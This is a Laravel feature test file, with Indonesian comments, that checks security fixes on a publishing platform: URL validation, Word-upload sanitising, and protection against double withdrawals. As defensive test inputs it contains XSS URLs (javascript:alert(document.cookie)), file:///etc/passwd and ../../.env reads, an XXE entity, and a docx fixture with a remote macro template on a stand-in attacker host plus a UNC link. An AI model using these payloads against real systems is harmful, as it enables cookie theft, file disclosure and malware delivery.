<?php

namespace Tests\Feature\Security;

use App\Models\Manuscript;
use App\Models\Order;
use App\Models\Role;
use App\Models\User;
use App\Models\WalletWithdrawal;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Laravel\Sanctum\Sanctum;
use Tests\Support\DocxFixture;
use Tests\TestCase;
use ZipArchive;

/**
 * Tindak lanjut uji keamanan:
 * 1. kolom tautan hanya menerima http/https;
 * 2. naskah Word asli: diperiksa saat unggah, dinetralkan saat diunduh;
 * 3. penarikan saldo tidak bisa diproses dua kali.
 */
class HardeningFollowUpTest extends TestCase
{
    use RefreshDatabase;

    private const BAD_URLS = [
        'javascript:alert(document.cookie)',
        'JaVaScRiPt:alert(1)',
        'data:text/html;base64,PHNjcmlwdD4=',
        'file:///etc/passwd',
        '//penyerang.example/a.png',
        '/storage/covers/a.png',
        '../../.env',
        'teks bebas',
        'https://contoh.id/a b.png',
    ];

    /** @var list<string> */
    private array $temp = [];

    protected function setUp(): void
    {
        parent::setUp();

        foreach (['user', 'penulis', 'editor', 'admin'] as $name) {
            Role::create(['name' => $name, 'display_name' => ucfirst($name)]);
        }
    }

    protected function tearDown(): void
    {
        array_map('unlink', array_filter($this->temp, 'file_exists'));
        parent::tearDown();
    }

    private function makeUser(array $roles): User
    {
        $user = User::create(['name' => 'Uji '.uniqid(), 'email' => uniqid('u').'@example.com', 'password' => 'Tartila@2026']);
        $user->markEmailAsVerified();
        $user->roles()->attach(Role::whereIn('name', $roles)->pluck('id'));

        return $user;
    }

    // ------------------------------------------------------------- 1. URL

    public function test_link_fields_only_accept_http_or_https_urls(): void
    {
        $admin = $this->makeUser(['admin']);
        $editor = $this->makeUser(['editor']);
        $penulis = $this->makeUser(['penulis']);

        $cases = [
            [$admin, 'POST', '/api/v1/admin/books/manual', ['front_cover', 'back_cover']],
            [$admin, 'POST', '/api/v1/admin/events', ['banner', 'meet_link', 'youtube_url', 'certificate_url']],
            [$admin, 'POST', '/api/v1/admin/book-chapter-projects', ['front_cover', 'back_cover']],
            [$editor, 'POST', '/api/v1/editor/book-chapter-projects', ['front_cover', 'back_cover']],
            [$penulis, 'POST', '/api/v1/auth/public-profile', ['profile_photo']],
            [$penulis, 'POST', '/api/v1/manuscripts', ['author_bio_photo']],
        ];

        foreach ($cases as [$user, $method, $uri, $fields]) {
            Sanctum::actingAs($user);

            foreach (self::BAD_URLS as $bad) {
                $response = $this->json($method, $uri, array_fill_keys($fields, $bad));

                foreach ($fields as $field) {
                    $this->assertContains(
                        $field,
                        array_keys($response->json('errors') ?? []),
                        "$uri menerima $field = $bad"
                    );
                }
            }

            $response = $this->json($method, $uri, array_fill_keys($fields, 'https://tartilapress.com/storage/covers/a.png'));
            $response->assertJsonMissingValidationErrors($fields);
        }

        // Pesan berbahasa Indonesia dengan nama kolom yang jelas.
        Sanctum::actingAs($admin);
        $this->postJson('/api/v1/admin/events', ['meet_link' => 'javascript:alert(1)'])
            ->assertJsonPath('errors.meet_link.0', 'Isian link meeting harus berupa tautan yang diawali http:// atau https://.');
    }

    public function test_csv_import_rejects_unsafe_cover_links(): void
    {
        Sanctum::actingAs($this->makeUser(['admin']));

        $csv = "title,price,chapter_count,front_cover\nAman,100000,2,https://tartilapress.com/a.png\nBahaya,100000,2,javascript:alert(1)\n";
        $file = UploadedFile::fake()->createWithContent('proyek.csv', $csv);

        $this->post('/api/v1/admin/book-chapter-projects/bulk-import', ['file' => $file], ['Accept' => 'application/json'])
            ->assertOk()
            ->assertJsonPath('data.created', 1)
            ->assertJsonPath('data.errors.0.row', 3)
            ->assertJsonPath('data.errors.0.message', 'Kolom front_cover harus berupa tautan http/https.');
    }

    // ------------------------------------------------- 2. Naskah Word asli

    /** .docx berisi template jarak jauh, gambar UNC dan makro. */
    private function dangerousDocx(): string
    {
        $path = tempnam(sys_get_temp_dir(), 'bahaya').'.docx';
        $this->temp[] = $path;
        DocxFixture::chapter($path, 'Judul', 'Penulis', 'A');

        $zip = new ZipArchive;
        $zip->open($path);
        $zip->addFromString('word/_rels/settings.xml.rels', '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            .'<Relationship Id="rIdTpl" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://penyerang.example/macro.dotm" TargetMode="External"/></Relationships>');
        $rels = (string) $zip->getFromName('word/_rels/document.xml.rels');
        $zip->addFromString('word/_rels/document.xml.rels', str_replace('</Relationships>',
            '<Relationship Id="rIdUnc" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="\\\\penyerang\\share\\a.png" TargetMode="External"/></Relationships>', $rels));
        $zip->addFromString('word/vbaProject.bin', 'MAKRO');
        $zip->close();

        return $path;
    }

    private function upload(User $author, string $path, string $name = 'naskah.docx')
    {
        $order = Order::create(['order_number' => 'ORD-'.uniqid(), 'user_id' => $author->id, 'status' => 'confirmed', 'subtotal' => 1, 'discount_total' => 0, 'editor_fee' => 0, 'total' => 1]);
        Sanctum::actingAs($author);

        return $this->post('/api/v1/manuscripts', [
            'order_id' => $order->id,
            'title' => 'Naskah Uji',
            'file' => new UploadedFile($path, $name, null, null, true),
        ], ['Accept' => 'application/json']);
    }

    public function test_original_word_uploads_are_checked_and_downloaded_as_a_neutralised_copy(): void
    {
        Storage::fake('local');
        $author = $this->makeUser(['penulis']);
        $manuscript = Manuscript::findOrFail($this->upload($author, $this->dangerousDocx())->assertCreated()->json('data.id'));
        $revision = $manuscript->latestRevision();

        // Berkas asli tersimpan apa adanya.
        $this->assertStringContainsString('penyerang', $this->entry(Storage::disk('local')->path($revision->file_path), 'word/_rels/settings.xml.rels'));

        // Yang diunduh admin: relasi berbahaya & makro sudah dinetralkan.
        Sanctum::actingAs($this->makeUser(['admin']));
        $response = $this->get("/api/v1/manuscripts/{$manuscript->id}/revisions/{$revision->id}/download")->assertOk();
        $downloaded = tempnam(sys_get_temp_dir(), 'unduh');
        $this->temp[] = $downloaded;
        copy($response->baseResponse->getFile()->getPathname(), $downloaded);

        $this->assertStringNotContainsString('penyerang', $this->entry($downloaded, 'word/_rels/settings.xml.rels'));
        $this->assertStringNotContainsString('penyerang', $this->entry($downloaded, 'word/_rels/document.xml.rels'));
        $this->assertStringContainsString('https://contoh.id/A', $this->entry($downloaded, 'word/_rels/document.xml.rels'));
        $this->assertNull($this->entry($downloaded, 'word/vbaProject.bin'));
        $this->assertStringContainsString('Isi bab A', $this->entry($downloaded, 'word/document.xml'));
    }

    public function test_broken_or_suspicious_word_uploads_are_rejected(): void
    {
        Storage::fake('local');
        $author = $this->makeUser(['penulis']);

        // Bukan zip.
        $fake = tempnam(sys_get_temp_dir(), 'palsu');
        $this->temp[] = $fake;
        file_put_contents($fake, 'ini bukan dokumen word');
        $this->upload($author, $fake)->assertStatus(422);

        // Relasi ber-DTD (pola serangan XXE).
        $path = tempnam(sys_get_temp_dir(), 'dtd').'.docx';
        $this->temp[] = $path;
        DocxFixture::chapter($path, 'Judul', 'Penulis', 'A');
        $zip = new ZipArchive;
        $zip->open($path);
        $zip->addFromString('word/_rels/document.xml.rels', '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>');
        $zip->close();
        $this->upload($author, $path)->assertStatus(422);

        $this->assertSame(0, Manuscript::count());

        // PDF tidak diperiksa sebagai Word.
        $pdf = tempnam(sys_get_temp_dir(), 'pdf');
        $this->temp[] = $pdf;
        file_put_contents($pdf, "%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n");
        $this->upload($author, $pdf, 'naskah.pdf')->assertCreated();
    }

    private function entry(string $path, string $name): ?string
    {
        $zip = new ZipArchive;
        $zip->open($path);
        $content = $zip->getFromName($name);
        $zip->close();

        return $content === false ? null : $content;
    }

    // ------------------------------------------------- 3. Penarikan saldo

    public function test_a_withdrawal_cannot_be_processed_twice(): void
    {
        $owner = $this->makeUser(['penulis']);
        $withdrawal = WalletWithdrawal::create([
            'user_id' => $owner->id, 'amount' => 100000, 'admin_fee' => 5000, 'net_amount' => 95000,
            'bank_name' => 'BSI', 'account_number' => '123', 'account_name' => 'Uji', 'status' => 'pending',
        ]);

        Sanctum::actingAs($this->makeUser(['admin']));
        $this->postJson("/api/v1/admin/withdrawals/{$withdrawal->id}/pay")->assertOk();
        $this->postJson("/api/v1/admin/withdrawals/{$withdrawal->id}/reject")->assertStatus(422);
        $this->postJson("/api/v1/admin/withdrawals/{$withdrawal->id}/pay")->assertStatus(422);

        $this->assertSame('paid', $withdrawal->fresh()->status);
    }
}
